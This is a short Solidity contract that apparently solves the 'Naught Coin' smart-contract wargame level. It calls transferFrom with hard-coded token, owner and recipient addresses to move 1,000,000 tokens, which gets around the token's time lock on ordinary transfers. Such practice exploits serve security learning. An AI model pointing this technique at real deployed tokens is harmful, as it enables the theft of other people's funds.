// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC20.sol";

contract BeatNaughtCoin {
    IERC20 public naughtCoin;

    constructor() {
        naughtCoin = IERC20(0xa7bCa656682f0cCcD2250f566f66A93164B71ff4);
    }

    function beatNaught() public {
        naughtCoin.transferFrom(
            0xAB75E66C63307396FE8456Ea7c42CBBF3CF36298,
            0xf9B0404C82f148B17032511110474d59Ab612bFb,
            1000000 ether
        );
    }
}
